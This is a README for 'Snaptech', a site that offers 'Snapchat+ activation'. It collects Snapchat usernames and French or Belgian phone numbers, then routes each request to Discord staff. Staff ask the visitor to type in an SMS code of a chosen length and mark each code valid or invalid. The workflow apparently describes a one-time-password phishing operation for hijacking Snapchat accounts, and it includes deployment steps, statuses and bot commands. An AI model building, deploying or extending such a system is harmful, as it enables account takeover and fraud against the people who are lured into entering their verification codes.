# 🎉 Snaptech — Snapchat+ Activation

> Platform for Snapchat+ activation with Discord staff panel, SMS code verification, and IP ban system.

---

## ✨ What's New in v3.3

| Feature | Description |
|---|---|
| 🚫 **Full IP Ban** | Banned IPs are now blocked from accessing **any page** of the site (not just API) |
| 🎨 **Operator Colors** | Discord embeds change color based on operator: 🔴 SFR / Telenet, 🟠 Orange / Orange BE, 🔵 Bouygues / BASE, 🟣 Proximus, 🟡 Other |
| 🚫 **Ban IP Button on ALL Embeds** | Available on every embed (new request, in progress, code submitted) |
| 🔄 **False Code Discord Notification** | When staff clicks "False Code", a new embed is sent to Discord so staff can choose a new action |
| 📱 **Fully Responsive** | Optimized for mobile, tablet, and desktop |
| 🎃 **Snapchat Ghost Background** | Animated Snapchat ghost pattern background |
| 🇬🇧 **Fully English Bot** | All bot messages, buttons, and embeds are in English |

---

## 🏗️ Architecture

```
📁 snaptech/
├── index.html              → Main page (form)
├── validation.html         → Validation page (staff waiting)
├── code.html               → SMS code entry page
├── banned.html             → Blocked IP page
├── style.css               → Global styles (responsive + GIF background)
├── script.js               → Form logic + ban check
├── validation.js           → Status polling + ban check
├── code.js                 → OTP input + ban check
├── api/
│   ├── middleware.js       → Reusable middleware (getClientIP, checkBannedIP)
│   ├── check-ban.js        → API: checks if IP is banned (called by frontend)
│   ├── snapchat.js         → API: registers request + Discord webhook
│   ├── status.js           → API: returns request status (polling)
│   ├── verify-code.js      → API: verifies user code
│   ├── staff-action.js     → API: staff actions (claim / set_length / true_code / false_code / wrong_number)
│   └── ban-ip.js           → API: IP banning
├── bot/
│   ├── bot.js              → Discord bot (discord.js v14+)
│   ├── package.json        → Bot dependencies
│   ├── Dockerfile          → For Railway/Render
│   └── .env.example        → Bot variables
├── package.json            → Vercel dependencies
├── vercel.json             → Vercel routing
├── snapchat_loop.gif       → Background animation
└── neon.sql                → Database schema
```

---

## 🚀 Deployment

### 1. Neon Database

1. Create a project on [neon.tech](https://neon.tech)
2. Run `neon.sql` in the SQL editor
3. Copy the **Connection String**

### 2. Vercel Site

```bash
# Environment variables for Vercel:
DATABASE_URL=postgres://...
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
STAFF_SECRET=a_long_random_secret
```

### 3. Discord Bot (Railway/Render — NOT Vercel)

> ⚠️ A Discord bot must run continuously. Vercel is serverless (functions stop). Host the bot on **Railway** or **Render**.

```bash
cd bot
# Create a .env file with the variables
npm install
npm start
```

**Bot variables:**
```
DISCORD_BOT_TOKEN=...
DISCORD_CLIENT_ID=...
DISCORD_GUILD_ID=...
DISCORD_LOG_CHANNEL_ID=...
DATABASE_URL=... (same as the site)
STAFF_SECRET=... (same as the site)
API_BASE=https://snaptech.vercel.app
```

### 4. Discord Config

1. Create an application on [Discord Developer Portal](https://discord.com/developers/applications)
2. Create a bot, copy the token
3. Add the bot to your server with scopes `bot` + `applications.commands`
4. In the server: `/config channel:#logs`

---

## 🔄 User Flow

1. **User** fills out the form → clicks "Activate"
2. Redirect to `validation.html` with spinner
3. **API** saves to DB + sends colored Discord embed
4. **Staff** sees the Discord embed → clicks "📋 Claim"
5. **Staff** chooses 4 or 6 digits
6. **Validation page** polls every 3s → detects `waiting_code` → redirects to `code.html`
7. **User** enters code → API verifies → `code_submitted`
8. **Discord** receives "Code Submitted" embed with ✅/❌/🚫 buttons
9. **Staff** validates or refuses the code
10. **User** is redirected to `success.html` or must re-enter

---

## 📊 Statuses

| Status | Description |
|--------|-------------|
| `pending` | Request received, waiting for staff |
| `processing` | Staff has claimed the request |
| `waiting_code` | Staff requested an N-digit code |
| `code_submitted` | User submitted a code, awaiting staff validation |
| `retry_code` | Code refused by staff, user must re-enter |
| `completed` | Code validated by staff |
| `wrong_number` | Wrong number reported |

---

## 🎨 Discord Embed Colors

| Operator | Color | Hex |
|-----------|---------|-----|
| SFR | 🔴 Red | `#E2001A` |
| Orange | 🟠 Orange | `#FF6600` |
| Bouygues | 🔵 Blue | `#0099CC` |
| BASE | 🔵 Blue | `#00A4E0` |
| Orange Belgium | 🟠 Orange | `#FF6600` |
| Proximus | 🟣 Purple | `#5C2D91` |
| Telenet | 🔴 Red | `#E2001A` |
| Other | 🟡 Yellow | `#FFFC00` |

---

## 🚫 IP Ban System

### How It Works

1. Staff clicks **🚫 Ban IP** on any embed
2. IP is added to the `banned_ips` table
3. **All** frontend pages call `/api/check-ban` on load → redirect to `banned.html` if banned
4. **All** API endpoints use the `checkBannedIP` middleware → return `403 Access denied`

### Slash Commands

| Command | Description |
|----------|-------------|
| `/config channel:#logs` | Sets the log channel |
| `/panel` | Shows the staff panel with color legend |
| `/claim phone:0612345678` | Claims a request |
| `/setlength phone:0612345678 length:4` | Sets code length |
| `/wrongnumber phone:0612345678` | Reports wrong number |
| `/banip ip:1.2.3.4` | Manually bans an IP |

---

## 📱 Responsive

The site is fully responsive:
- **Mobile**: reduced padding, adapted font sizes, no iOS zoom on inputs
- **Tablet**: spacious layout, wider cards
- **Desktop**: premium design with backdrop blur and soft shadows

---

## 🛡️ Security

- `STAFF_SECRET` verification on all staff actions
- Phone number validation (FR + BE)
- Snapchat username validation (3-15 characters)
- Robust IP ban with `x-forwarded-for` support
- Reusable middleware to avoid code duplication
- Frontend ban check on every page load

---

## 📦 Dependencies

**Site (Vercel):**
- `@neondatabase/serverless`

**Bot (Railway/Render):**
- `discord.js` v14+
- `@neondatabase/serverless`
- `dotenv`

---

*Snaptech © 2026 — All rights reserved*
